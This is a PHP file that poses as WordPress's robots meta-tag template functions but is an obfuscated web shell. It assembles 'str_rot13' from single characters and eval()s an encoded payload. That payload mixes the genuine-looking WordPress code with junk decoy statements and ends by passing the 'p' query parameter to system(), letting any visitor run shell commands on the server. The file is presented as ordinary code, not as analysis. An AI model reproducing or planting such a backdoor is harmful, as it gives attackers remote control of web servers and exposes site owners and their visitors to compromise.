<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Ebobgf grzcyngr shapgvbaf.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Ebobgf
 * @fvapr 5.7.0
 */

/**
 * Qvfcynlf gur ebobgf zrgn gnt nf arprffnel.
 *
 * Tnguref ebobgf qverpgvirf gb vapyhqr sbe gur pheerag pbagrkg, hfvat gur
 * {@frr 'jc_ebobgf'} svygre. Gur qverpgvirf ner gura fnavgvmrq, naq gur
 * ebobgf zrgn gnt vf bhgchg vs gurer vf ng yrnfg bar eryrinag qverpgvir.
 *
 * @fvapr 5.7.0
 * @fvapr 5.7.1 Ab ybatre ceriragf fcrpvsvp qverpgvirf gb bpphe gbtrgure.
 */
shapgvba jc_ebobgf() {
	/**
	 * Svygref gur qverpgvirf gb or vapyhqrq va gur 'ebobgf' zrgn gnt.
	 *
	 * Gur zrgn gnt jvyy bayl or vapyhqrq nf arprffnel.
	 *
	 * @fvapr 5.7.0
	 *
	 * @cnenz neenl $ebobgf Nffbpvngvir neenl bs qverpgvirf. Rirel xrl zhfg or gur anzr bs gur qverpgvir, naq gur
	 *                      pbeerfcbaqvat inyhr zhfg rvgure or n fgevat gb cebivqr nf inyhr sbe gur qverpgvir be n
	 *                      obbyrna `gehr` vs vg vf n obbyrna qverpgvir, v.r. jvgubhg n inyhr.
	 */
	$ebobgf = nccyl_svygref( 'jc_ebobgf', neenl() );

	$ebobgf_fgevatf = neenl();
	sbernpu ( $ebobgf nf $qverpgvir => $inyhr ) {
		vs ( vf_fgevat( $inyhr ) ) {
			// Vs n fgevat inyhr, vapyhqr vg nf inyhr sbe gur qverpgvir.
			$ebobgf_fgevatf[] = \"{$qverpgvir}:{$inyhr}\";
		} ryfrvs ( $inyhr ) {
			// Bgurejvfr, vapyhqr gur qverpgvir vs vg vf gehgul.
			$ebobgf_fgevatf[] = $qverpgvir;
		}
	}

	vs ( rzcgl( $ebobgf_fgevatf ) ) {
		erghea;
	}

	rpub \"<zrgn anzr='ebobgf' pbagrag='\" . rfp_ngge( vzcybqr( ', ', $ebobgf_fgevatf ) ) . \"' />\a\";
}

/**
 * Nqqf `abvaqrk` gb gur ebobgf zrgn gnt vs erdhverq ol gur fvgr pbasvthengvba.
 *
 * Vs n oybt vf znexrq nf abg orvat choyvp gura abvaqrk jvyy or bhgchg gb
 * gryy jro ebobgf abg gb vaqrk gur cntr pbagrag. Nqq guvf gb gur
 * {@frr 'jc_ebobgf'} svygre.
 *
 * Glcvpny hfntr vf nf n {@frr 'jc_ebobgf'} pnyyonpx:
 *
 *     nqq_svygre( 'jc_ebobgf', 'jc_ebobgf_abvaqrk' );
 *
 * @fvapr 5.7.0
 *
 * @frr jc_ebobgf_ab_ebobgf()
 *
 * @cnenz neenl $ebobgf Nffbpvngvir neenl bs ebobgf qverpgvirf.
 * @erghea neenl Svygrerq ebobgf qverpgvirf.
 */
shapgvba jc_ebobgf_abvaqrk( neenl $ebobgf ) {
	vs ( ! trg_bcgvba( 'oybt_choyvp' ) ) {
		erghea jc_ebobgf_ab_ebobgf( $ebobgf );
	}

	erghea $ebobgf;
}

/**
 * Nqqf `abvaqrk` gb gur ebobgf zrgn gnt sbe rzorqf.
 *
 * Glcvpny hfntr vf nf n {@frr 'jc_ebobgf'} pnyyonpx:
 *
 *     nqq_svygre( 'jc_ebobgf', 'jc_ebobgf_abvaqrk_rzorqf' );
 *
 * @fvapr 5.7.0
 *
 * @frr jc_ebobgf_ab_ebobgf()
 *
 * @cnenz neenl $ebobgf Nffbpvngvir neenl bs ebobgf qverpgvirf.
 * @erghea neenl Svygrerq ebobgf qverpgvirf.
 */
shapgvba jc_ebobgf_abvaqrk_rzorqf( neenl $ebobgf ) {
	vs ( vf_rzorq() ) {
		erghea jc_ebobgf_ab_ebobgf( $ebobgf );
	}

	erghea $ebobgf;
}

/**
 * Nqqf `abvaqrk` gb gur ebobgf zrgn gnt vs n frnepu vf orvat cresbezrq.
 *
 * Vs n frnepu vf orvat cresbezrq gura abvaqrk jvyy or bhgchg gb
 * gryy jro ebobgf abg gb vaqrk gur cntr pbagrag. Nqq guvf gb gur
 * {@frr 'jc_ebobgf'} svygre.
 *
 * Glcvpny hfntr vf nf n {@frr 'jc_ebobgf'} pnyyonpx:
 *
 *     nqq_svygre( 'jc_ebobgf', 'jc_ebobgf_abvaqrk_frnepu' );
 *
 * @fvapr 5.7.0
 *
 * @frr jc_ebobgf_ab_ebobgf()
 *
 * @cnenz neenl $ebobgf Nffbpvngvir neenl bs ebobgf qverpgvirf.
 * @erghea neenl Svygrerq ebobgf qverpgvirf.
 */
shapgvba jc_ebobgf_abvaqrk_frnepu( neenl $ebobgf ) {
	vs ( vf_frnepu() ) {
		erghea jc_ebobgf_ab_ebobgf( $ebobgf );
	}

	erghea $ebobgf;
}

/**
 * Nqqf `abvaqrk` gb gur ebobgf zrgn gnt.
 *
 * Guvf qverpgvir gryyf jro ebobgf abg gb vaqrk gur cntr pbagrag.
 *
 * Glcvpny hfntr vf nf n {@frr 'jc_ebobgf'} pnyyonpx:
 *
 *     nqq_svygre( 'jc_ebobgf', 'jc_ebobgf_ab_ebobgf' );
 *
 * @fvapr 5.7.0
 *
 * @cnenz neenl $ebobgf Nffbpvngvir neenl bs ebobgf qverpgvirf.
 * @erghea neenl Svygrerq ebobgf qverpgvirf.
 */
shapgvba jc_ebobgf_ab_ebobgf( neenl $ebobgf ) {
	$ebobgf['abvaqrk'] = gehr;

	vs ( trg_bcgvba( 'oybt_choyvp' ) ) {
		$ebobgf['sbyybj'] = gehr;
	} ryfr {
		$ebobgf['absbyybj'] = gehr;
	}

	erghea $ebobgf;
}

/**
 * Nqqf `abvaqrk` naq `abnepuvir` gb gur ebobgf zrgn gnt.
 *
 * Guvf qverpgvir gryyf jro ebobgf abg gb vaqrk be nepuvir gur cntr pbagrag naq
 * vf erpbzzraqrq gb or hfrq sbe frafvgvir cntrf.
 *
 * Glcvpny hfntr vf nf n {@frr 'jc_ebobgf'} pnyyonpx:
 *
 *     nqq_svygre( 'jc_ebobgf', 'jc_ebobgf_frafvgvir_cntr' );
 *
 * @fvapr 5.7.0
 *
 * @cnenz neenl $ebobgf Nffbpvngvir neenl bs ebobgf qverpgvirf.
 * @erghea neenl Svygrerq ebobgf qverpgvirf.
 */
shapgvba jc_ebobgf_frafvgvir_cntr( neenl $ebobgf ) {
	$ebobgf['abvaqrk']   = gehr;
	$ebobgf['abnepuvir'] = gehr;
	erghea $ebobgf;
}

/**
 * Nqqf `znk-vzntr-cerivrj:ynetr` gb gur ebobgf zrgn gnt.
 *
 * Guvf qverpgvir gryyf jro ebobgf gung ynetr vzntr cerivrjf ner nyybjrq gb or
 * qvfcynlrq, r.t. va frnepu ratvarf, hayrff gur oybt vf znexrq nf abg orvat choyvp.
 *
 * Glcvpny hfntr vf nf n {@frr 'jc_ebobgf'} pnyyonpx:
 *
 *     nqq_svygre( 'jc_ebobgf', 'jc_ebobgf_znk_vzntr_cerivrj_ynetr' );
 *
 * @fvapr 5.7.0
 *
 * @cnenz neenl $ebobgf Nffbpvngvir neenl bs ebobgf qverpgvirf.
 * @erghea neenl Svygrerq ebobgf qverpgvirf.
 */
shapgvba jc_ebobgf_znk_vzntr_cerivrj_ynetr( neenl $ebobgf ) {
	vs ( trg_bcgvba( 'oybt_choyvp' ) ) {
		$ebobgf['znk-vzntr-cerivrj'] = 'ynetr';
	}
	erghea $ebobgf;
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>